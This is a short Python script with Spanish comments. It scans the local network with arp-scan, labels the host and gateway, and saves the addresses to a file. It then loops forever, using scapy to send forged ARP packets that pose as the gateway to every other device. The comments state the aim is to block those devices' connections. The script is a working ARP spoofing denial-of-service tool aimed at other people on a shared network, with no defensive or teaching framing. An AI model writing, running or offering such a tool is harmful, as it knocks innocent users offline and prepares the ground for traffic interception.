import os
import socket
from scapy.all import *
import signal
import subprocess

def handle_ctrl_c(signal, frame):
    print("\nPrograma detenido por el usuario.")
    sys.exit(0)
# Ejecutar el comando arp-scan
result = subprocess.run(["arp-scan", "--localnet"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Obtener la salida del comando
output = result.stdout.decode().strip()

# Filtrar solo las direcciones IP
ips = re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)

# Obtiene la direccion IP del host
def get_ip_address():
    output = subprocess.run(["ip", "a"], capture_output=True, text=True).stdout
    matches = re.findall(r"inet ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})", output)
    for match in matches:
        if not match.startswith("127."):
            ip_address = match
            break
    return ip_address
host_ip = get_ip_address()
# Obtiene la direccion IP de la puerta de enlace
gateway = os.popen("ip route show default | awk '/default/ {print $3}'").read().rstrip()

# Ordenar las diferentes IPs
def ip_to_tuple(ip):
    return tuple(map(int, ip.split(".")))

archivo2 = open("ip.txt","w")
sorted_ips = sorted(ips, key=ip_to_tuple)
for ip in sorted_ips:
    if ip == gateway:
        print(f"{ip} (puerta de enlace)")
        archivo2.writelines(f"{ip} (puerta de enlace)\n")
    elif ip == host_ip:
        print(f"{ip} (host)")
        archivo2.writelines(f"{ip} (host)\n")
    else:
        print(ip)
        archivo2.writelines(ip)
        archivo2.write("\n")

archivo2.close()
#Escribe las ip en la pagina php

#archivo = open("ip.txt", "w")
#archivo.writelines(sorted_ips)
#archivo.close()

#with open('ip.txt', 'w') as f:
#    f.write(ip)

# Lista de direcciones IP a bloquear
ips_to_block = [ip for ip in ips if ip not in (host_ip, gateway)]

signal.signal(signal.SIGINT, handle_ctrl_c)

stop = False

while not stop:
# Construye y envia paquetes ARP para bloquear las conexiones
    for ip in ips_to_block:
        arp_packet = ARP(pdst=ip, psrc=gateway, hwdst=Ether().src)
        send(arp_packet, verbose=0)

